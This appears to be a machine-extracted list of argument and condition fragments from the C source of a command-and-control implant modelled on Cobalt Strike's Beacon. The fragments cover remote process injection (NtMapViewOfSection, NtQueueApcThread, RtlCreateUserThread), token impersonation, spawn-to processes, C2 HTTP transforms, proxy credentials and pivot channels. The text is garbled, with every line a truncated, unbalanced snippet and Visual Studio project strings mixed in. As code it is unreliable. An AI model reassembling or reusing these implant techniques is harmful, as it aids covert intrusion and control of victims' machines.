+"(char* buffer, int length, HANDLE hToken, formatp* locals"
+"(char* buffer, int length, char* mode"
+"(char* buffer, int length, int ipAddress"
+"(char* buffer, int length, int type, BOOL isHeap, void(* cleanupCallback"
+"(char* buffer, int size"
+"(char* buffer, int size, BOOL impersonate, BOOL isMsgMode"
+"(char* buffer, int size, BOOL x86, BOOL ignoreToken"
+"(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_INFORMATION* processInfo, int creationFlags, BOOL ignoreToken"
+"(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_INFORMATION* processInfo, int creationFlags, BOOL ignoreToken, int parentPid"
+"(char* data, int size, BOOL x86"
+"(char* data, int size, BOOL x86, BOOL ignoreToken"
+"(char* domain = strtok(gFailoverDomainsStr, "","""
+"(char* domain, char* username, char* password"
+"(char* expanded, size_t size, BOOL x86"
+"(char* filename, WIN32_FIND_DATAA* findData"
+"(char* payload, int size"
+"(char* pubkey, char* in, int inlen, char* out, int* outlen"
+"(char* recover, char* recoverable, int recoverableLength, int maxGet"
+"(char* setting, int headerSize, int* pHeaderLength"
+"(char* src, wchar_t* dst, int max"
+"(char* target, short port"
+"(char* token = strtok(gRandomDomainsArray, "","""
+"(char*, int"
+"(chunkMaxSize, download->remainingData"
+"(cmd, ""sysnative"""
+"(cmd, 0, MAX_CMD"
+"(cmd, MAX_CMD, args, MAX_ARGS"
+"(cmd, MAX_CMD, expandedCmd, MAX_EXPANDED_CMD"
+"(cmd, MAX_CMD, x86"
+"(cmd, buffer, length"
+"(cmd, cmdLength, startupInfo, processInfo, creationFlags, ignoreToken, gParentPid"
+"(cmd, data, size"
+"(cmd, length, &si, &pi, 0, FALSE"
+"(cmd, lpCommandLine, 0x4000"
+"(cmd, strlen(cmd"
+"(code, 0, codeLength"
+"(color, label, format, ..."
+"(computerName, &pcbBuffer"
+"(connect(sock, (struct sockaddr*"
+"(const char * key, void * ptr"
+"(const char nb, const char* in, const int inlen, char* out, const int outlen"
+"(const char* a1, const char* a2, BOOL isDirectory"
+"(const char* getUri, SESSION* session, char* data, const int maxGet"
+"(const char* in, const int inlen, char* out, const int outlen"
+"(const char* in, int inlen, char* out, int outlen"
+"(const char* lpSrc, char* lpDst, size_t size"
+"(const int addr, const short port, const int backlog"
+"(copiedDomains, domains, strlen(domains"
+"(current->isActive && strcmp(expanded, current->expandedCmd"
+"(current->isActive && strstr(cmd, current->expandedCmd"
+"(data, 10000"
+"(data, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL"
+"(data, sizeof(char"
+"(datap * parser, char * buffer, int size"
+"(datap * parser, int * size"
+"(datap * parser, int size"
+"(datap * parser, sizedbuf* sb"
+"(datap* parser, char* buffer, int size"
+"(datap* parser, int size"
+"(datap* parser, int* size"
+"(datap* parser, sizedbuf* sb"
+"(domain, gIdentityDomain, IDENTITY_MAX_WCHARS_DOMAIN"
+"(domain, lpDomain, 0x400"
+"(domain, username, password"
+"(domain, username, password, cmd, 0, &pi"
+"(download, chunkMaxSize"
+"(dst, 0, size"
+"(dst, buffer, length"
+"(entry->record.ptr, 0, MEM_RELEASE"
+"(entry->record.ptr, 0, entry->record.size"
+"(execution->processInfo, &cmds"
+"(execution->processInfo->hProcess, 0"
+"(expandedFull, argument->expandedFullCmd, MAX_EXPANDED_FULL"
+"(file, 0, SEEK_END"
+"(file, 0, SEEK_SET"
+"(fileName, '\\'"
+"(filename, &findData"
+"(filename, MAX_FILENAME, SOURCE_DIRECTORY, STRLEN(SOURCE_DIRECTORY"
+"(filename, lpCurrentFindFileData->cFileName, FALSE"
+"(filename, lpFileNameInternal, TRUE"
+"(filename, pipe"
+"(filename, pipe, 0"
+"(filename, pipe, flags"
+"(finalUri, 0, sizeof(finalUri"
+"(finalUri, sizeof(finalUri"
+"(format, ##__VA_ARGS__"
+"(format, (char*"
+"(format, buffer, maxsz"
+"(format->buffer, format->size - format->length, fmt, args"
+"(format->buffer, text, len"
+"(format.original, 0, format.length"
+"(formatp * format, char * buffer, int size"
+"(formatp * format, char * fmt, ..."
+"(formatp * format, char * text, int len"
+"(formatp * format, char value"
+"(formatp * format, int * size"
+"(formatp * format, int maxsz"
+"(formatp * format, int value"
+"(formatp * format, short value"
+"(formatp* format, char value"
+"(formatp* format, char* buffer, int size"
+"(formatp* format, char* fmt, ..."
+"(formatp* format, char* text, int len"
+"(formatp* format, int maxsz"
+"(formatp* format, int value"
+"(formatp* format, int* size"
+"(formatp* format, short value"
+"(gCbcKey, mask, sizeof(gCbcKey"
+"(gCopiedDefaultDomains, "","""
+"(gCopiedDefaultDomains, domains, srcLength + 1"
+"(gDownloadChunk->remainingData + totalRead, 1, toRead, download->file"
+"(gFailoverDomainsStr, domains, domainsLength"
+"(gHmacKey, mask + sizeof(gCbcKey"
+"(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_DOMAIN * sizeof(WCHAR"
+"(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_PASSWORD * sizeof(WCHAR"
+"(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_USERNAME * sizeof(WCHAR"
+"(gImportedPshScript, buffer, size"
+"(gInternetConnect, INTERNET_OPTION_PROXY_PASSWORD, S_PROXY_PASSWORD, STRLEN(S_PROXY_PASSWORD"
+"(gInternetConnect, INTERNET_OPTION_PROXY_USERNAME, S_PROXY_USER, STRLEN(S_PROXY_USER"
+"(gInternetOpen, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout"
+"(gInternetOpen, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout"
+"(gIv, INIT_VECTOR, STRLEN(INIT_VECTOR"
+"(gRecords, sizeof(RECORD_ENTRY"
+"(gSession.data, format.original, format.length"
+"(gSpawnToX64, 0, MAX_SPAWN_TO_X64"
+"(gSpawnToX86, 0, MAX_SPAWN_TO_X86"
+"(hFile, &dataLength, sizeof(dataLength"
+"(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, dwSize"
+"(hFileMapping, handle, &lpBaseAddress, 0, 0, NULL, &dwViewSize, ViewShare, 0, S_PROCINJ_PERMS"
+"(hInternet, &bytesAvailable, 0, 0"
+"(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, &length"
+"(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer"
+"(hInternet, NetworkStatusCallback"
+"(hInternet, S_HEADERS_REMOVE, INFINITE, HTTP_ADDREQ_FLAG_REPLACE"
+"(hInternet, transform.headers, strlen(transform.headers"
+"(hModule, ""IsWow64Process"""
+"(hModule, ""NtMapViewOfSection"""
+"(hModule, ""NtQueueApcThread"""
+"(hModule, ""RtlCreateUserThread"""
+"(hModule, ""Wow64DisableWow64FsRedirection"""
+"(hModule, ""Wow64RevertWow64FsRedirection"""
+"(hModule, lpProcName"
+"(hPipe, buffer, headerSize"
+"(hPipe, buffer, size - totalRead, &read, NULL"
+"(hPipe, pid32, callbackType, description, isMsgMode"
+"(hPipe, waitTime, 500"
+"(hPreelevationAuxThread, 15000"
+"(hProcess, &Wow64Process"
+"(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE"
+"(hProcess, NULL, FALSE, 0, 0, 0, lpStartAddress, lpParameter, &hThread, &ClientId"
+"(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I"
+"(hProcess, TOKEN_QUERY, &hToken"
+"(hProcess, pid, payload, len, payloadOffset, NULL, 0"
+"(hRead, waitTime, 500"
+"(hRequest, transform.headers, strlen(transform.headers"
+"(hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == NULL || !Thread32First(hSnapshot, &te32"
+"(hThread, INFINITE"
+"(hThread, lpApcContext->payload, lpApcContext, NULL, NULL"
+"(hToken, accountName, length"
+"(hash_memory(gHashSha256, (unsigned char*"
+"(hmac_memory(gHashSha256, gHmacKey, sizeof(gHmacKey"
+"(i = 0, j = 0; i < inlen && j < outlen; i++, j += 2"
+"(img, 0, MEM_RELEASE"
+"(img, code, codeLength"
+"(info, sizeof(info"
+"(injection, payload, size"
+"(injection->process, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE"
+"(injection->process, injection->pid, payload, size"
+"(injection->process, lpApcContext, &data, sizeof(APC_ROUTINE_CONTEXT"
+"(int argc, char* argv[]"
+"(int callbackType, int waitTime, int reflectiveLoaderOffset, char* payload, int payloadLength, char* argument, int argumentLength, char* description, int descriptionLength, BOOL x86, BOOL ignoreToken"
+"(int cmd, char* buffer, int size"
+"(int min, int max"
+"(int type, char * data, int len"
+"(int type, char * fmt, ..."
+"(int type, char * s1"
+"(int type, char* data, int len"
+"(int type, char* fmt, ..."
+"(int type, int d1"
+"(int type, int d1, char * s1"
+"(int type, int d1, int d2"
+"(int type, int d1, int d2, char* s1"
+"(int value, int multiple"
+"(ioctlsocket(protocol->channel.socket, FIONREAD, &argp"
+"(ioctlsocket(sock, FIONBIO, &argp"
+"(ipAddress, port, 10"
+"(isPending ? CALLBACK_PENDING : CALLBACK_PROCESS_LIST, cbBuffer, cbLength"
+"(job->description, description, sizeof(job->description"
+"(lBuffer, expanded, size"
+"(lBuffer, sizeof(lBuffer"
+"(length - totalWrote, 0x2000"
+"(length, MAX_CMD"
+"(lib, ""ws2_32.lib"""
+"(libtommath, libtomcrypt"
+"(locals, ""%s\n"", name"
+"(locals, 0x400"
+"(locals, 0x4000"
+"(locals, MAX_ARGS"
+"(locals, MAX_BUFFER"
+"(locals, MAX_CMD"
+"(locals, MAX_DESCRIPTION"
+"(locals, MAX_DOMAIN"
+"(locals, MAX_DST"
+"(locals, MAX_EXISTING_FILENAME"
+"(locals, MAX_EXPANDED"
+"(locals, MAX_EXPANDED_CMD"
+"(locals, MAX_EXPANDED_FULL"
+"(locals, MAX_FILENAME"
+"(locals, MAX_NEW_FILENAME"
+"(locals, MAX_ORIGINAL"
+"(locals, MAX_PASSWORD"
+"(locals, MAX_RUNNABLE_CMD"
+"(locals, MAX_SRC"
+"(locals, MAX_USERNAME"
+"(lpApcContext && WriteProcessMemory(injection->process, lpApcContext, pAllocedData, dwSize, &wrote"
+"(lpBaseAddress, 0, MEM_RELEASE"
+"(lpCurrentFindFileData->cFileName, "".."""
+"(lpDomain, lpUsername, lpPassword, cmd, CREATE_SUSPENDED, lpProcessInfo"
+"(lpFileMap, payload, size"
+"(lpFileName, ""rb"""
+"(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, flags, NULL"
+"(lpFileName, MAX_FILENAME, ""%s\\%s"", filename, findData->cFileName"
+"(lpFileName, MAX_FILENAME, ""%s\\*"", filename"
+"(lpFileName, MAX_FILENAME, lpBuffer, NULL"
+"(lpFileName, findData"
+"(lpFileName, lpCurrentFindFileData"
+"(lpFileName, mode"
+"(lpFileNameInternal, MAX_FILENAME, ""%s"", lpCurrentFindFileData->cFileName"
+"(lpPathName, 0x4000, ""%s\\%s"", a1, a2"
+"(lpSrc, NULL, 0"
+"(lpSrc, lpDst, size"
+"(lpStartAddress, lpParameter"
+"(name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 2, 0, 0, 0, NULL"
+"(name, buffer, length"
+"(newCmd, 0, commandLine.MaximumLength"
+"(original, argument->expandedCmd, MAX_EXPANDED"
+"(original, expanded, MAX_EXPANDED"
+"(out, sizeof(out"
+"(pAlloc, 0, MEM_RELEASE"
+"(pAlloc, payload, size"
+"(pAllocedData->payload, (PVOID"
+"(pInfo, pInfo->hProcess, pInfo->dwProcessId, payload, p_len, p_offset, arg, a_len"
+"(pProtocol, gRouteAux->data, MAX_ROUTE_AUX - offsetof(ROUTE_DATA, data"
+"(pProtocol->waitForData(pProtocol, 300000, 10"
+"(pProtocol->write(pProtocol, wdata, len"
+"(param, 0, sizeof(param"
+"(parser, &sb"
+"(parser, 0x400"
+"(parser, 0x4000"
+"(parser, MAX_COMPUTER_NAME"
+"(parser, MAX_FILE_NAME"
+"(parser, MAX_HEADERS"
+"(parser, MAX_INFO"
+"(parser, MAX_SPAWN_TO_X64"
+"(parser, MAX_SPAWN_TO_X86"
+"(parser, MAX_URI"
+"(parser, MAX_URI_PARAMS"
+"(parser, MAX_USER_NAME"
+"(parser, buffer, size"
+"(parser, parser->length"
+"(parser, size"
+"(parser, sizeof(OSVERSIONINFOA"
+"(parser, transform->outputLength"
+"(parser->original, 0, parser->size"
+"(password, gIdentityPassword, IDENTITY_MAX_WCHARS_PASSWORD"
+"(password, lpPassword, 0x400"
+"(path, NULL"
+"(path, buffer, length"
+"(payload, size"
+"(payload, size, x86"
+"(pi.hProcess, 10000"
+"(port, content, contentLength"
+"(port, gImportedPshScript, strlen(gImportedPshScript"
+"(processHeap, 0, size"
+"(protocol, buffer, sizeof(buffer"
+"(protocol->channel.handle, buffer, dataSize"
+"(protocol->channel.handle, buffer, length"
+"(protocol->channel.handle, header, headerSize"
+"(protocol->channel.handle, waitTime, iterWaitTime"
+"(protocol->channel.socket, SD_BOTH"
+"(protocol->channel.socket, buf, sizeof(char"
+"(protocol->channel.socket, buffer, dataSize"
+"(protocol->channel.socket, buffer, length"
+"(protocol->channel.socket, header, headerSize"
+"(push, "".text$KKK000"""
+"(push, "".text$KKK001"""
+"(push, "".text$KKK002"""
+"(push, "".text$KKK003"""
+"(recoverable, recoverableLength, temp, &outlen"
+"(recoverable, recoverableLength, temp, maxGet"
+"(recoverable, temp + param, recoverableLength"
+"(recoverable, temp, recoverableLength"
+"(relocation, code, img, (char*"
+"(relocation, code, img, data, relocation->e_value"
+"(relocation, code, img, img, relocation->e_value"
+"(relocation, code, img, rdata, relocation->e_value"
+"(rijndael_setup(gCbcKey, sizeof(gCbcKey"
+"(rsa_encrypt_key_ex(in, inlen, out, outlen, ""Zz"", STRLEN(""Zz"""
+"(runUnderConfig, cmd, lpCurrentDirectory"
+"(runnableCmd, expandedCmd, MAX_EXPANDED_CMD"
+"(short port, char* content, int contentLength"
+"(size, CHANNEL_BUFFER_SIZE - sizeof(int"
+"(sock, (struct sockaddr*"
+"(sock, backlog"
+"(sock, channelId, 180000, CHANNEL_TYPE_CONNECT, 0, CHANNEL_STATE_1"
+"(sock, channelId, 30000, CHANNEL_TYPE_CONNECT, 0, CHANNEL_STATE_2"
+"(sock, id, 180000, CHANNEL_TYPE_LISTEN, port, CHANNEL_STATE_2"
+"(sock, newId, 0, CHANNEL_TYPE_BIND, port, CHANNEL_STATE_2"
+"(sock, newId, 0, CHANNEL_TYPE_TCP_PIVOT, port, CHANNEL_STATE_2"
+"(socket, (SOCKADDR*"
+"(socket, 120"
+"(socket, SD_BOTH"
+"(socket, buffer + total, length - total, 0"
+"(socket, data + i, sizeof(char"
+"(spawnData, spawnSize, x86, TRUE"
+"(step == STEP_NETBIOSU ? 'A' : 'a', transform->transformed, transformedLength, transform->temp, transform->outputLength"
+"(strcmp(lpCurrentFindFileData->cFileName, ""."""
+"(struct _PROTOCOL*, char*, int"
+"(struct _PROTOCOL*, int, int"
+"(struct _RUN_UNDER_CONTEXT*, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, STARTUPINFO*"
+"(substr + STRLEN(""system32"""
+"(substr, ""system32"", STRLEN(""system32"""
+"(target, port"
+"(targetSocket, packed, packedLength, 0"
+"(temp, recoverable, param"
+"(that is, drop the stolen token from the current thread"
+"(the ""Software"""
+"(threadInfo, 0, MEM_RELEASE"
+"(toWideChar(runUnderConfig->cmd, cmd, sizeof(cmd"
+"(toWrite, 0x2000"
+"(transform->headers, transform->temp, MAX_HEADERS"
+"(transform->temp + paramLength, transform->transformed, transformedLength"
+"(transform->temp, 0, transform->outputLength"
+"(transform->temp, MAX_TEMP, ""%s%s"", transform->uri, transform->transformed"
+"(transform->temp, MAX_TEMP, ""%s%s: %s\r\n"", transform->headers, param, transform->transformed"
+"(transform->temp, MAX_TEMP, ""%s%s\r\n"", transform->headers, S_HOST_HEADER"
+"(transform->temp, MAX_TEMP, ""%s%s\r\n"", transform->headers, isHostHeaderStepDone ? S_HOST_HEADER : param"
+"(transform->temp, MAX_TEMP, ""%s%s\r\n"", transform->headers, param"
+"(transform->temp, MAX_TEMP, ""%s&%s"", transform->uriParams, param"
+"(transform->temp, MAX_TEMP, ""%s&%s=%s"", transform->uriParams, param, transform->transformed"
+"(transform->temp, MAX_TEMP, ""?%s"", param"
+"(transform->temp, MAX_TEMP, ""?%s=%s"", param, transform->transformed"
+"(transform->temp, param, paramLength"
+"(transform->temp, transform->transformed, transformedLength"
+"(transform->transformed + transformedLength, param, paramLength"
+"(transform->transformed, 0, transform->outputLength"
+"(transform->transformed, response, response_len"
+"(transform->transformed, session, session_len"
+"(transform->transformed, transform->temp, transformedLength"
+"(transform->transformed, transformedLength, transform->temp, &outlen"
+"(transform->transformed, transformedLength, transform->temp, transform->outputLength"
+"(transform->uri, transform->temp, MAX_URI"
+"(transform->uriParams, transform->temp, MAX_URI_PARAMS"
+"(transform.uri, MAX_URI, ""%s"", uri"
+"(type, &channelId, sizeof(channelId"
+"(type, lastError, runUnderConfig->cmd"
+"(type, pid"
+"(uidString, sizeof(uidString"
+"(userName, &pcbBuffer"
+"(username, gIdentityUsername, IDENTITY_MAX_WCHARS_USERNAME"
+"(username, lpUsername, 0x400"
+"(value, 2"
+"(webResponse->content, content, contentLength"
+"(webResponse->socket, NULL, NULL"
+"(x86, cmd"
+( dataSize < 0 || dataSize > length
+( openLink->callbackData == NULL 
+(!(TEB$ActivationContextStack(
+(!(interfaceInfo[i].iiFlags & IFF_LOOPBACK
+(!GetLastError(
+(!IS_X64(
+(!ImpersonateLoggedOnUser(gIdentityToken
+(!ImpersonateLoggedOnUser(hElevationToken
+(!ImpersonateLoggedOnUser(hToken
+(!ImpersonateLoggedOnUser(token
+(!IsProcess64Bit(processInfo->hProcess
+(!ProcessIdToSessionId(GetCurrentProcessId(
+(!buffer
+(!channel->state
+(!closesocket((SOCKET
+(!current
+(!dynamicFunction
+(!fnWow64DisableWow64FsRedirection
+(!fnWow64RevertWow64FsRedirection
+(!gChannelBuffer
+(!gChannels
+(!gIdentityToken || execution->ignoreToken
+(!gImportedPshScript
+(!gIsFailoverActive
+(!gLinks[i].isOpen
+(!gPostBufferLength
+(!gRandomDomainsArray
+(!gRouteAux
+(!gSpawnToX86 || !gSpawnToX64
+(!gThreadStartAddress
+(!hModule
+(!hProcess
+(!hThread
+(!img
+(!injection->isProcessX64
+(!injection->isSameArchAsHostSystem
+(!injection->isSamePid
+(!injection->isTemporary
+(!injection->isTemporary || !injection->isSameArchAsHostSystem
+(!job
+(!job->isDead
+(!job->isPipe
+(!lHostent
+(!lpProc
+(!lpTotalBytesAvail
+(!openLink
+(!pAlloc
+(!pAllocedData
+(!parser
+(!processAddress
+(!ptr
+(!read
+(!received
+(!result
+(!size
+(!substr
+(!success
+(!target
+(!x86
+(&SetErrorMode
+(&aes_desc
+(&childContext
+(&context
+(&exceptfds
+(&format
+(&locals
+(&now
+(&oldValue
+(&parentContext
+(&parser
+(&pi
+(&readfds
+(&relocationsParser
+(&sha256_desc
+(&si
+(&sprng_desc
+(&transform
+(&writefds
+('$(UserRootDir
+((DWORD
+((DWORD64
+((SOCKET
+((ULONGLONG
+((char*
+((execution->creationFlags & CREATE_SUSPENDED
+((in[j] - nb
+((int
+((sizeof(s
+((unsigned char*
+((void(*
+() != ERROR_PIPE_CONNECTED
+() % (max - min + 1
+() ((char*
+() (FALSE
+() (TRUE
+() + 0x1a8
+() + 0x2c8
+() < timeout
+() >= timeout
+(*(int*
+(*(short*
+(*attempts > 0
+(*attempts >= S_MAX_RETRY_STRATEGY_ATTEMPTS
+(*close
+(*currentFunction == newFunction
+(*flush
+(*fnBeaconCleanupProcess
+(*fnBeaconDataExtract
+(*fnBeaconDataInt
+(*fnBeaconDataLength
+(*fnBeaconDataParse
+(*fnBeaconDataPtr
+(*fnBeaconDataShort
+(*fnBeaconErrorD
+(*fnBeaconErrorDD
+(*fnBeaconErrorNA
+(*fnBeaconFormatAlloc
+(*fnBeaconFormatAppend
+(*fnBeaconFormatFree
+(*fnBeaconFormatInt
+(*fnBeaconFormatPrintf
+(*fnBeaconFormatReset
+(*fnBeaconFormatToString
+(*fnBeaconGetSpawnTo
+(*fnBeaconInjectProcess
+(*fnBeaconInjectTemporaryProcess
+(*fnBeaconIsAdmin
+(*fnBeaconOutput
+(*fnBeaconPrintf
+(*fnBeaconRevertToken
+(*fnBeaconSpawnTemporaryProcess
+(*fnBeaconUseToken
+(*fnFreeLibrary
+(*fnGetModuleHandleA
+(*fnGetProcAddress
+(*fnLoadLibraryA
+(*fnToWideChar
+(*lpVirtualFree
+(*pipe
+(*pipe != INVALID_HANDLE_VALUE
+(*priorSleepTime
+(*read
+(*transform->uriParams
+(*waitForData
+(*write
+(++*attempts >= S_MAX_RETRY_STRATEGY_INCREASE && !*priorSleepTime
+(++attempts >= 20
+(++seconds >= 10
+(...
+(0
+(0x400
+(0x4000
+(0x4C00
+(0xA000
+(1
+(100
+(1000
+(200
+(2048
+(500
+(8*(sizeof(DWORD
+(A valid address
+(APC_ROUTINE_CONTEXT
+(ARGUMENT_ENTRY
+(ARGUMENT_ENTRY*
+(ARGUMENT_ENTRY* current = gArguments; current != NULL; current = current->next
+(ATTEMPT_SLEEP
+(AdditionalIncludeDirectories
+(BEACON_INFO * info
+(BOF
+(BOOL ignoreToken
+(BYTE*
+(BeaconDataLength(&locals
+(BeaconIsAdmin(
+(CHANNEL_BUFFER_SIZE
+(CHANNEL_ENTRY
+(CHANNEL_ENTRY* ch = gChannels; ch; ch = (CHANNEL_ENTRY*
+(CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next
+(CHANNEL_ENTRY* channel = gChannels; channel; channel = prev->next
+(ChannelReceiveData(
+(Configuration
+(DOWNLOAD_ENTRY* download
+(DOWNLOAD_ENTRY* download = gDownloads; download; download = download->next
+(DWORD
+(DWORD dwAttributeCount
+(DWORD totalWrote = 0; totalWrote < length; totalWrote += wrote
+(DWORD64
+(ERROR_ADJUST_ARGUMENTS_BY_ARCH_FAILED
+(ERROR_CONNECT_TO_PIPE_TIMEOUT
+(ERROR_MAXIMUM_LINKS_REACHED
+(ERROR_NO_SLOT_FOR_FUNCTION
+(ERROR_OPEN_PROCESS_TOKEN_PRIVS_FAILED
+(ERROR_OPEN_TOKEN_FAILED
+(ERROR_REAL_FAKE_ARGS_NO_MATCH
+(ERROR_RELOCATION_TRUNCATED_TO_FIT
+(ERROR_STAGER_VIA_TCP_CONNECTION_FAILED
+(EXPANDED_CMD
+(ExtensibilityGlobals
+(FALSE
+(FD_ISSET((SOCKET
+(FN_KERNEL32_ISWOW64PROCESS
+(FN_NTDLL_NTMAPVIEWOFSECTION
+(FN_NTDLL_NTQUEUEAPCTHREAD
+(FN_NTDLL_RTLCREATEUSERTHREAD
+(FilesystemIsDirectory(filepath
+(GetCurrentProcess(
+(GetLastError(
+(GetProcessHeap(
+(GetTickCount(
+(HANDLE
+(HANDLE hProcess
+(HANDLE hToken
+(HANDLE token
+(HEAP_RECORD
+(HINTERNET hInternet
+(HMODULE hLibModule
+(HTTP
+(INTERFACE_INFO
+(IS_X64(
+(ImpersonateNamedPipeClient(hPrenamedPipe
+(JOB_ENTRY*
+(JOB_ENTRY* job = gJobs; job; job = *pNext
+(JOB_ENTRY* job = gJobs; job; job = job->next
+(JOB_ENTRY* newJob
+(LICENSE.md
+(LPCSTR lpLibFileName
+(LPCSTR lpModuleName
+(LPSTARTUPINFOW
+(LPTHREAD_START_ROUTINE
+(LPVOID lpAttributeList
+(LPVOID lpThreadParameter
+(MAX_BUFFER
+(MAX_CALLBACK_DATA
+(MAX_CMD
+(MAX_DATA_SIZE
+(MAX_DESCRIPTION
+(MAX_DOMAIN + MAX_USERNAME + MAX_PASSWORD
+(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME
+(MAX_EXPANDED
+(MAX_FILENAME
+(MAX_FILENAME + MAX_BUFFER
+(MAX_HEADERS + MAX_URI_PARAMS + MAX_URI + transform->outputLength + transform->outputLength + transform->outputLength
+(MAX_HEADER_SIZE
+(MAX_ORIGINAL + MAX_EXPANDED + MAX_EXPANDED_FULL
+(MAX_ROUTE_AUX
+(MAX_RUNNABLE_CMD + MAX_EXPANDED_CMD + MAX_ARGS + MAX_CMD
+(MAX_SPAWN_TO_X86 + MAX_SPAWN_TO_X64
+(MAX_SRC + MAX_DST
+(MonoDevelop/Xamarin Studio
+(NTAPI* FN_NTDLL_NTMAPVIEWOFSECTION
+(NTAPI* FN_NTDLL_NTQUEUEAPCTHREAD
+(NTAPI* FN_NTDLL_RTLCREATEUSERTHREAD
+(NULL
+(NetworkCheckResponse(hInternet
+(NetworkCheckResponse(hRequest
+(Not a valid address
+(OSVERSIONINFOA
+(OldValue
+(OpenThreadToken(GetCurrentThread(
+(PAPC_ROUTINE_CONTEXT pData
+(PAYLOAD*
+(PEB*
+(PROC*
+(PROCESSENTRY32
+(PROCESS_INFORMATION * pInfo
+(PROCESS_INFORMATION* pInfo
+(PROTOCOL* protocol
+(PRUN_UNDER_CONTEXT	context
+(PRUN_UNDER_CONTEXT context
+(PTVS
+(PVOID OldValue
+(PVOID* OldValue
+(Platform
+(PreprocessorDefinitions
+(ProjectConfigurationPlatforms
+(RECORD_ENTRY
+(RELOCATION*
+(RELOCATION* relocation = (RELOCATION*
+(RUN_UNDER_CONFIG* execution
+(RUN_UNDER_CONFIG* runUnderConfig
+(RandomInt(
+(SEM_NOOPENFILEERRORBOX | SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS
+(SID
+(SOCKET
+(STARTUPINFOA
+(STARTUPINFOEXA
+(S_CFG_CAUTION
+(S_CFG_CAUTION == TRUE
+(S_EXIT_FUNK == TRUE
+(S_HEADERS_REMOVE
+(S_HOST_HEADER
+(S_KILLDATE
+(S_MAX_RETRY_STRATEGY_ATTEMPTS <= 0
+(S_PROCINJ_ALLOCATOR && injection->isSameArchAsHostSystem
+(S_PROCINJ_PERMS_I != S_PROCINJ_PERMS
+(S_PROCINJ_PERMS_I == S_PROCINJ_PERMS
+(S_PROTOCOL & PROTOCOL_HTTPS
+(S_PROXY_BEHAVIOR == PROXY_DIRECT
+(S_PROXY_BEHAVIOR == PROXY_MANUAL || S_PROXY_BEHAVIOR == PROXY_MANUAL_CREDS
+(S_PROXY_BEHAVIOR == PROXY_MANUAL_CREDS
+(S_PROXY_BEHAVIOR == PROXY_PRECONFIG
+(SelfIsWindowsVistaOrLater(
+(SolutionConfigurationPlatforms
+(SolutionDir
+(SolutionProperties
+(THREADENTRY32
+(THREAD_INFO
+(THREAD_INFO* threadInfo
+(TRANSFORM* transform
+(TRUE
+(UserRootDir
+(VCTargetsPath
+(WAIT_TIMEOUT
+(WCHAR
+(WEB_RESPONSE* webResponse
+(WINAPI* FN_KERNEL32_CREATETHREAD
+(WINAPI* FN_KERNEL32_GETPROCADDRESS
+(WINAPI* FN_KERNEL32_ISWOW64PROCESS
+(WINAPI* FN_KERNEL32_LOADLIBRARYA
+(WINAPI* FN_KERNEL32_VIRTUALALLOC
+(WINAPI* FN_KERNEL32_VIRTUALPROTECT
+(WINAPI* WOW64DISABLEWOW64FSREDIRECTION
+(WINAPI* WOW64REVERTWOW64FSREDIRECTION
+(WINAPI* cleanup
+(WINAPI* updateProcessAttributes
+(WOW64DISABLEWOW64FSREDIRECTION
+(WOW64REVERTWOW64FSREDIRECTION
+(WSAGetLastError(
+(Xamarin productivity tool
+([0-9]
+([0-9][0-9]
+(_In_ LPCSTR lpLibFileName
+(_IsWow64Process == NULL
+(_NtMapViewOfSection == NULL
+(_NtQueueApcThread
+(_NtQueueApcThread == NULL
+(_RtlCreateUserThread == NULL
+(_WIN32_WINNT_VISTA >> 8
+(__stdcall* callback
+(aLen <= 0
+(acceptSocket
+(acceptSocket == INVALID_SOCKET
+(addr
+(aes_desc.name
+(after
+(and thus not available
+(api
+(args
+(attributeList == NULL
+(aux
+(available
+(bapi
+(bapi* beaconApi
+(baseTimestamp
+(bid
+(bindResult == SOCKET_ERROR
+(buffer
+(bufferSize >= size
+(bytesAvailable == 0
+(c
+(cbc_done(&gEncryptCbc
+(ch->id == id
+(channel
+(channel->id
+(channel->lastActive != 0
+(channel->state != CHANNEL_STATE_0 && channel->port == port
+(channel->state != CHANNEL_STATE_1
+(channel->state != CHANNEL_STATE_2
+(channel->state && channel->type == CHANNEL_TYPE_BIND && channel->port == port
+(channel->state == CHANNEL_STATE_1 && channel->id == channelId
+(channel->type == CHANNEL_TYPE_BIND
+(channel->type == CHANNEL_TYPE_BIND || channel->type == CHANNEL_TYPE_TCP_PIVOT
+(channel->type == CHANNEL_TYPE_CONNECT
+(channel->type == CHANNEL_TYPE_TCP_PIVOT
+(char
+(char method = BeaconDataByte(&parser
+(char*
+(char* data
+(char* expanded
+(char* filename
+(char* filepath
+(char* in
+(cmd
+(code + relocation->r_vaddr
+(commandLine.MaximumLength
+(const ARGUMENT_ENTRY* current = gArguments; current != NULL; current = current->next
+(const char * key
+(const char* uri
+(const struct _RUN_UNDER_CONTEXT*
+(contains which files were open etc.
+(contentLength
+(context->handle
+(context->previousErrorMode
+(couldAdjust
+(count
+(count == 0
+(cross platform F# VS Code tools
+(current && current->isActive
+(current->isActive
+(currentTimestamp > baseTimestamp + strategy.failSeconds
+(data.isExecuted
+(dataArgument
+(dataSize < 0 || dataSize > length
+(datap
+(datap * parser
+(datap*
+(datap* parser
+(diff + (UINT_MAX / 2 + 1
+(disableWow64FsRedirection
+(domain
+(domains
+(domainsLength
+(download
+(download->fid
+(download->fid == fid
